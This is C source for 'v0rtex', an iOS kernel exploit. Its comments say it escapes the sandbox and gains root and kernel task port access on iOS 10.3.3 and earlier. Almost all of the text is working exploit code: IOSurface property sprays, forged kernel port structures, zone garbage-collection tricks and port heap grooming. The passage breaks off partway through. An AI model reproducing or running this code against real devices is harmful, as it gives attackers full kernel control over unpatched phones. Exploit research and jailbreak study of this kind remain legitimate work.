// v0rtex
// Bug by Ian Beer.
// Exploit by Siguza.

// Status quo:
// - Escapes sandbox, gets root and tfp0, should work on A7-A10 devices <=10.3.3.
// - Can call arbitrary kernel functions with up to 7 args via KCALL().
// - Relies on mach_zone_force_gc() which was removed in iOS 11, but the same
//   effect should be achievable by continuously spraying through zones and
//   measuring how long it takes - garbage collection usually takes ages. :P
// - Occasionally seems to mess with SpringBoard, i.e. apps don't open when you
//   tap on their icons - sometimes affects only v0rtex, sometimes all of them,
//   sometimes even freezes the lock screen. Can happen even if the exploit
//   aborts very early on, so I'm not sure whether it's even due to that, or due
//   to my broken UI.
// - Most common panic at this point is "pmap_tte_deallocate(): ... refcnt=0x1",
//   which can occur when the app is killed, but only if shmem_addr has been
//   faulted before. Faulting that page can _sometimes_ increase the ref count
//   on its tte entry, which causes the mentioned panic when the task is
//   destroyed and its pmap with it. Exact source of this is unknown, but I
//   suspect it happening in pmap_enter_options_internal(), depending on page
//   compression status (i.e. if the page is compressed refcnt_updated is set to
//   true and the ref count isn't increased afterwards, otherwise it is).
//   On 32-bit such a panic can be temporarily averted with mlock(), but that
//   seems to cause even greater trouble later with zalloc, and on 64-bit mlock
//   even refuses to work. Deallocating shmem_addr from our address space does
//   not fix the problem, and neither does allocating new memory at that address
//   and faulting into it (which should _guarantee_ that the corresponding pmap
//   entry is updated). Fixing up the ref count manually is very tedious and
//   still seems to cause trouble with zalloc. Calling mach_zone_force_gc()
//   after releasing the IOSurfaceRootUserClient port seems to _somewhat_ help,
//   as does calling sched_yield() before mach_vm_remap() and faulting the page
//   right after, so that's what I'm doing for now.
//   In the long term, this should really be replaced by something deterministic
//   that _always_ works (like removing the tte entirely).

// Not sure what'll really become of this, but it's certainly not done yet.
// Pretty sure I'll leave iOS 11 to Ian Beer though, for the time being.

#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <stdlib.h>             // malloc, free
#include <string.h>             // strerror
#include <unistd.h>             // usleep, setuid, getuid
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <CoreFoundation/CoreFoundation.h>

#include "common.h"             // LOG, kptr_t
#include "offsets.h"
#include "v0rtex.h"

// ********** ********** ********** get rid of ********** ********** **********

#ifdef __LP64__
#   define OFFSET_TASK_ITK_SELF                         0xd8
#   define OFFSET_IOUSERCLIENT_IPC                      0x9c
#else
#   define OFFSET_TASK_ITK_SELF                         0x9c
#   define OFFSET_IOUSERCLIENT_IPC                      0x5c
#endif

#define IOSURFACE_CREATE_OUTSIZE    0x3c8 /* XXX 0x6c8 for iOS 11.0, 0xbc8 for 11.1.2 */

// ********** ********** ********** constants ********** ********** **********

#ifdef __LP64__
#   define KERNEL_MAGIC             MH_MAGIC_64
#   define KERNEL_HEADER_OFFSET     0x4000
#else
#   define KERNEL_MAGIC             MH_MAGIC
#   define KERNEL_HEADER_OFFSET     0x1000
#endif

#define KERNEL_SLIDE_STEP           0x100000

#define NUM_BEFORE                  0x2000
#define NUM_AFTER                   0x1000
#define FILL_MEMSIZE                0x4000000
#if 0
#define NUM_DATA                    0x4000
#define DATA_SIZE                   0x1000
#endif
#ifdef __LP64__
#   define VTAB_SIZE                200
#else
#   define VTAB_SIZE                250
#endif

const uint64_t IOSURFACE_CREATE_SURFACE =  0;
const uint64_t IOSURFACE_SET_VALUE      =  9;
const uint64_t IOSURFACE_GET_VALUE      = 10;
const uint64_t IOSURFACE_DELETE_VALUE   = 11;

const uint32_t IKOT_TASK                = 2;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

// ********** ********** ********** macros ********** ********** **********

#define UINT64_ALIGN_DOWN(addr) ((addr) & ~7)
#define UINT64_ALIGN_UP(addr) UINT64_ALIGN_DOWN((addr) + 7)

#if 0
#define UNALIGNED_COPY(src, dst, size) \
do \
{ \
    for(volatile uint32_t *_src = (volatile uint32_t*)(src), \
                          *_dst = (volatile uint32_t*)(dst), \
                          *_end = (volatile uint32_t*)((uintptr_t)(_src) + (size)); \
        _src < _end; \
        *(_dst++) = *(_src++) \
    ); \
} while(0)
#endif

#ifdef __LP64__
#   define UNALIGNED_KPTR_DEREF(addr) (((kptr_t)*(volatile uint32_t*)(addr)) | (((kptr_t)*((volatile uint32_t*)(addr) + 1)) << 32))
#else
#   define UNALIGNED_KPTR_DEREF(addr) ((kptr_t)*(volatile uint32_t*)(addr))
#endif

#define VOLATILE_BCOPY32(src, dst, size) \
do \
{ \
    for(volatile uint32_t *_src = (volatile uint32_t*)(src), \
                          *_dst = (volatile uint32_t*)(dst), \
                          *_end = (volatile uint32_t*)((uintptr_t)(_src) + (size)); \
        _src < _end; \
        *(_dst++) = *(_src++) \
    ); \
} while(0)

#define VOLATILE_BZERO32(addr, size) \
do \
{ \
    for(volatile uint32_t *_ptr = (volatile uint32_t*)(addr), \
                          *_end = (volatile uint32_t*)((uintptr_t)(_ptr) + (size)); \
        _ptr < _end; \
        *(_ptr++) = 0 \
    ); \
} while(0)

#define RELEASE_PORT(port) \
do \
{ \
    if(MACH_PORT_VALID((port))) \
    { \
        _kernelrpc_mach_port_destroy_trap(self, (port)); \
        port = MACH_PORT_NULL; \
    } \
} while(0)

// ********** ********** ********** IOKit ********** ********** **********

typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;
extern CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
extern io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
extern kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
extern kern_return_t IOServiceClose(io_connect_t client);
extern kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
extern kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
extern kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);

// ********** ********** ********** other unexported symbols ********** ********** **********

extern kern_return_t _kernelrpc_mach_port_allocate_trap(mach_port_name_t target, mach_port_right_t right, mach_port_name_t *name);
extern kern_return_t _kernelrpc_mach_port_insert_right_trap(mach_port_name_t target, mach_port_name_t name, mach_port_name_t poly, mach_msg_type_name_t polyPoly);
extern kern_return_t _kernelrpc_mach_port_destroy_trap(mach_port_name_t target, mach_port_name_t name);
extern kern_return_t _kernelrpc_mach_vm_deallocate_trap(mach_port_name_t target, mach_vm_address_t address, mach_vm_size_t size);
extern kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);

// ********** ********** ********** helpers ********** ********** **********

static const char *errstr(int r)
{
    return r == 0 ? "success" : strerror(r);
}

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

// ********** ********** ********** MIG ********** ********** **********

static kern_return_t my_mach_zone_force_gc(host_t host)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;

    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = host;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 221;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = OutP->RetCode;
    }
    return ret;
}

static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name, mach_vm_address_t *context)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;

    InP->NDR = NDR_record;
    InP->name = name;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3228;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = OutP->RetCode;
    }
    if(ret == KERN_SUCCESS)
    {
        *context = OutP->context;
    }
    return ret;
}

kern_return_t my_mach_port_set_context(task_t task, mach_port_name_t name, mach_vm_address_t context)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
        mach_vm_address_t context;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;

    InP->NDR = NDR_record;
    InP->name = name;
    InP->context = context;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3229;
    InP->Head.msgh_reserved = 0;

    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = OutP->RetCode;
    }
    return ret;
}

// Raw MIG function for a merged IOSurface deleteValue + setValue call, attempting to increase performance.
// Prepare everything - sched_yield() - fire.
static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void *buf, mach_vm_size_t len)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        uint32_t inband_input[4];
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } DeleteRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } SetRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_type_number_t inband_outputCnt;
        char inband_output[4096];
        mach_msg_type_number_t scalar_outputCnt;
        uint64_t scalar_output[16];
        mach_vm_size_t ool_output_size;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    // Delete
    union {
        DeleteRequest In;
        Reply Out;
    } DMess;

    DeleteRequest *DInP = &DMess.In;
    Reply *DOutP = &DMess.Out;

    DInP->NDR = NDR_record;
    DInP->selector = IOSURFACE_DELETE_VALUE;
    DInP->scalar_inputCnt = 0;

    DInP->inband_input[0] = surfaceId;
    DInP->inband_input[2] = transpose(propertyId);
    DInP->inband_input[3] = 0x0; // Null terminator
    DInP->inband_inputCnt = sizeof(DInP->inband_input);

    DInP->ool_input = 0;
    DInP->ool_input_size = 0;

    DInP->inband_outputCnt = sizeof(uint32_t);
    DInP->scalar_outputCnt = 0;
    DInP->ool_output = 0;
    DInP->ool_output_size = 0;

    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    DInP->Head.msgh_remote_port = client;
    DInP->Head.msgh_local_port = mig_get_reply_port();
    DInP->Head.msgh_id = 2865;
    DInP->Head.msgh_reserved = 0;

    // Set
    union {
        SetRequest In;
        Reply Out;
    } SMess;

    SetRequest *SInP = &SMess.In;
    Reply *SOutP = &SMess.Out;

    SInP->NDR = NDR_record;
    SInP->selector = IOSURFACE_SET_VALUE;
    SInP->scalar_inputCnt = 0;

    SInP->inband_inputCnt = 0;

    SInP->ool_input = (mach_vm_address_t)buf;
    SInP->ool_input_size = len;

    SInP->inband_outputCnt = sizeof(uint32_t);
    SInP->scalar_outputCnt = 0;
    SInP->ool_output = 0;
    SInP->ool_output_size = 0;

    SInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    SInP->Head.msgh_remote_port = client;
    SInP->Head.msgh_local_port = mig_get_reply_port();
    SInP->Head.msgh_id = 2865;
    SInP->Head.msgh_reserved = 0;

    // Deep breath
    sched_yield();

    // Fire
    kern_return_t ret = mach_msg(&DInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = DOutP->RetCode;
    }
    if(ret != KERN_SUCCESS)
    {
        return ret;
    }
    ret = mach_msg(&SInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(SetRequest), (mach_msg_size_t)sizeof(Reply), SInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
    {
        ret = SOutP->RetCode;
    }
    return ret;
}

// ********** ********** ********** data structures ********** ********** **********

#ifdef __LP64__
    typedef volatile struct
    {
        kptr_t prev;
        kptr_t next;
        kptr_t start;
        kptr_t end;
    } kmap_hdr_t;
#endif

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef volatile struct {
    union {
        kptr_t port;
        uint32_t index;
    } notify;
    union {
        uint32_t name;
        kptr_t size;
    } name;
} kport_request_t;

typedef volatile union
{
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
                     type     :  8;
#ifdef __LP64__
            uint32_t pad;
#endif
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
#ifdef __LP64__
        uint32_t pad;
#endif
        kptr_t map;
    } a;
    struct {
        char pad[OFFSET_TASK_ITK_SELF];
        kptr_t itk_self;
    } b;
} ktask_t;

// ********** ********** ********** more helper functions because it turns out we need access to data structures... sigh ********** ********** **********

static kern_return_t reallocate_fakeport(io_connect_t client, uint32_t surfaceId, uint32_t pageId, uint64_t off, mach_vm_size_t pagesize, kport_t *kport, uint32_t *buf, mach_vm_size_t len)
{
    bool twice = false;
    if(off + sizeof(kport_t) > pagesize)
    {
        twice = true;
        VOLATILE_BCOPY32(kport, (void*)((uintptr_t)&buf[9] + off), pagesize - off);
        VOLATILE_BCOPY32((void*)((uintptr_t)kport + (pagesize - off)), &buf[9], sizeof(kport_t) - off);
    }
    else
    {
        VOLATILE_BCOPY32(kport, (void*)((uintptr_t)&buf[9] + off), sizeof(kport_t));
    }
    buf[6] = transpose(pageId);
    kern_return_t ret = reallocate_buf(client, surfaceId, pageId, buf, len);
    if(twice && ret == KERN_SUCCESS)
    {
        ++pageId;
        buf[6] = transpose(pageId);
        ret = reallocate_buf(client, surfaceId, pageId, buf, len);
    }
    return ret;
}

kern_return_t readback_fakeport(io_connect_t client, uint32_t pageId, uint64_t off, mach_vm_size_t pagesize, uint32_t *request, size_t reqsize, uint32_t *resp, size_t respsz, kport_t *kport)
{
    request[2] = transpose(pageId);
    size_t size = respsz;
    kern_return_t ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, reqsize, resp, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", pageId, size, mach_error_string(ret));
    if(ret == KERN_SUCCESS && size == respsz)
    {
        size_t sz = pagesize - off;
        if(sz > sizeof(kport_t))
        {
            sz = sizeof(kport_t);
        }
        VOLATILE_BCOPY32((void*)((uintptr_t)&resp[4] + off), kport, sz);
        if(sz < sizeof(kport_t))
        {
            ++pageId;
            request[2] = transpose(pageId);
            size = respsz;
            ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, reqsize, resp, &size);
            LOG("getValue(%u): 0x%lx bytes, %s", pageId, size, mach_error_string(ret));
            if(ret == KERN_SUCCESS && size == respsz)
            {
                VOLATILE_BCOPY32(&resp[4], (void*)((uintptr_t)kport + sz), sizeof(kport_t) - sz);
            }
        }
    }
    if(ret == KERN_SUCCESS && size < respsz)
    {
        LOG("Response too short.");
        ret = KERN_FAILURE;
    }
    return ret;
}

// ********** ********** ********** ye olde pwnage ********** ********** **********

kern_return_t v0rtex(offsets_t *off, v0rtex_cb_t callback, void *cb_data)
{
    kern_return_t retval = KERN_FAILURE,
                  ret = 0;
    task_t self = mach_task_self();
    host_t host = mach_host_self();

    io_connect_t client = MACH_PORT_NULL;
    mach_port_t stuffport = MACH_PORT_NULL;
    mach_port_t realport = MACH_PORT_NULL;
    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
    mach_port_t port = MACH_PORT_NULL;
    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
    mach_port_t fakeport = MACH_PORT_NULL;
    mach_vm_size_t pagesize = 0,
                   shmemsz = 0;
    uint32_t *dict_prep = NULL,
             *dict_big = NULL,
             *dict_small = NULL,
             *resp = NULL;
    mach_vm_address_t shmem_addr = 0;
    mach_port_array_t maps = NULL;

    /********** ********** data hunting ********** **********/

    vm_size_t pgsz = 0;
    ret = _host_page_size(host, &pgsz);
    pagesize = pgsz;
    LOG("page size: 0x%llx, %s", pagesize, mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    if(!MACH_PORT_VALID(service))
    {
        goto out;
    }

    ret = IOServiceOpen(service, self, 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        goto out;
    }

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    union
    {
        char _padding[IOSURFACE_CREATE_OUTSIZE];
        struct
        {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            uint32_t id;
        } data;
    } surface;
    VOLATILE_BZERO32(&surface, sizeof(surface));
    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    LOG("surface ID: 0x%x", surface.data.id);

    /********** ********** data preparation ********** **********/

    size_t num_data = FILL_MEMSIZE / pagesize,
           dictsz_prep  = (5 + 4 * num_data) * sizeof(uint32_t),
           dictsz_big   = dictsz_prep + (num_data * pagesize),
           dictsz_small = 9 * sizeof(uint32_t) + pagesize,
           respsz = 4 * sizeof(uint32_t) + pagesize;
    dict_prep = malloc(dictsz_prep);
    if(!dict_prep)
    {
        LOG("malloc(prep): %s", strerror(errno));
        goto out;
    }
    dict_big = malloc(dictsz_big);
    if(!dict_big)
    {
        LOG("malloc(big): %s", strerror(errno));
        goto out;
    }
    dict_small = malloc(dictsz_small);
    if(!dict_small)
    {
        LOG("malloc(small): %s", strerror(errno));
        goto out;
    }
    resp = malloc(respsz);
    if(!resp)
    {
        LOG("malloc(resp): %s", strerror(errno));
        goto out;
    }
    VOLATILE_BZERO32(dict_prep,  dictsz_prep);
    VOLATILE_BZERO32(dict_big,   dictsz_big);
    VOLATILE_BZERO32(dict_small, dictsz_small);
    VOLATILE_BZERO32(resp,       respsz);

    // ipc.ports zone uses 0x3000 allocation chunks, but hardware page size before A9
    // is actually 0x1000, so references to our reallocated memory may be shifted
    // by (0x1000 % sizeof(kport_t))
    kport_t triple_kport;
    VOLATILE_BZERO32(&triple_kport, sizeof(triple_kport));
    triple_kport.ip_lock.data = 0x0;
    triple_kport.ip_lock.type = 0x11;
#ifdef __LP64__
    triple_kport.ip_messages.port.waitq.waitq_queue.next = 0x0;
    triple_kport.ip_messages.port.waitq.waitq_queue.prev = 0x11;
    triple_kport.ip_nsrequest = 0x0;
    triple_kport.ip_pdrequest = 0x11;
#endif

    uint32_t *prep = dict_prep;
    uint32_t *big = dict_big;
    *(big++) = *(prep++) = surface.data.id;
    *(big++) = *(prep++) = 0x0;
    *(big++) = *(prep++) = kOSSerializeMagic;
    *(big++) = *(prep++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(big++) = *(prep++) = kOSSerializeEndCollection | kOSSerializeDictionary | num_data;
    for(size_t i = 0; i < num_data; ++i)
    {
        *(big++) = *(prep++) = kOSSerializeSymbol | 5;
        *(big++) = *(prep++) = transpose(i);
        *(big++) = *(prep++) = 0x0; // null terminator
        *(big++) = (i + 1 >= num_data ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1);
        size_t j = 0;
        for(uintptr_t ptr = (uintptr_t)big, end = ptr + pagesize; ptr < end; ptr += sizeof(triple_kport))
        {
            size_t sz = end - ptr;
            if(sz > sizeof(triple_kport))
            {
                sz = sizeof(triple_kport);
            }
            triple_kport.ip_context = (0x10000000ULL | (j << 20) | i) << 32;
#ifdef __LP64__
            triple_kport.ip_messages.port.pad = 0x20000000 | (j << 20) | i;
            triple_kport.ip_lock.pad = 0x30000000 | (j << 20) | i;
#endif
            VOLATILE_BCOPY32(&triple_kport, ptr, sz);
            ++j;
        }
        big += (pagesize / sizeof(uint32_t));
        *(prep++) = (i + 1 >= num_data ? kOSSerializeEndCollection : 0) | kOSSerializeBoolean | 1;
    }

    dict_small[0] = surface.data.id;
    dict_small[1] = 0x0;
    dict_small[2] = kOSSerializeMagic;
    dict_small[3] = kOSSerializeEndCollection | kOSSerializeArray | 1;
    dict_small[4] = kOSSerializeEndCollection | kOSSerializeDictionary | 1;
    dict_small[5] = kOSSerializeSymbol | 5;
    // [6] later
    dict_small[7] = 0x0; // null terminator
    dict_small[8] = kOSSerializeEndCollection | kOSSerializeString | (pagesize - 1);

    uint32_t dummy = 0;
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict_prep, dictsz_prep, &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("setValue(prep): %s", mach_error_string(ret));
        goto out;
    }

    /********** ********** black magic ********** **********/

    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &stuffport);
    LOG("stuffport: %x, %s", stuffport, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(stuffport))
    {
        goto out;
    }

    ret = _kernelrpc_mach_port_insert_right_trap(self, stuffport, stuffport, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
    LOG("realport: %x, %s", realport, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(realport))
    {
        goto out;
    }

    sched_yield();
    // Clean out full pages already in freelists
    ret = my_mach_zone_force_gc(host);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
        goto out;
    }

    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
            goto out;
        }
    }

    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &port);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_port_allocate: %s", mach_error_string(ret));
        goto out;
    }
    if(!MACH_PORT_VALID(port))
    {
        LOG("port: %x", port);
        goto out;
    }

    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
        if(ret != KERN_SUCCESS)
        {
            LOG("mach_port_allocate: %s", mach_error_string(ret));
            goto out;
        }
    }

    LOG("port: %x", port);

    ret = _kernelrpc_mach_port_insert_right_trap(self, port, port, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

#pragma pack(4)
    typedef struct {
        mach_msg_base_t base;
        mach_msg_ool_ports_descriptor_t desc[2];
    } StuffMsg;
#pragma pack()
    StuffMsg msg;
    msg.base.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.base.header.msgh_remote_port = stuffport;
    msg.base.header.msgh_local_port = MACH_PORT_NULL;
    msg.base.header.msgh_id = 1234;
    msg.base.header.msgh_reserved = 0;
    msg.base.body.msgh_descriptor_count = 2;
    msg.desc[0].address = before;
    msg.desc[0].count = NUM_BEFORE;
    msg.desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    msg.desc[0].deallocate = FALSE;
    msg.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.desc[1].address = after;
    msg.desc[1].count = NUM_AFTER;
    msg.desc[1].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    msg.desc[1].deallocate = FALSE;
    msg.desc[1].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ret = mach_msg(&msg.base.header, MACH_SEND_MSG, (mach_msg_size_t)sizeof(msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    LOG("mach_msg: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }

    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        RELEASE_PORT(before[i]);
    }
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        RELEASE_PORT(after[i]);
    }

#if 0
    uint32_t dict[DATA_SIZE / sizeof(uint32_t) + 7] =
    {
        // Some header or something
        surface.data.id,
        0x0,

        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,

        kOSSerializeString | (DATA_SIZE - 1),
    };
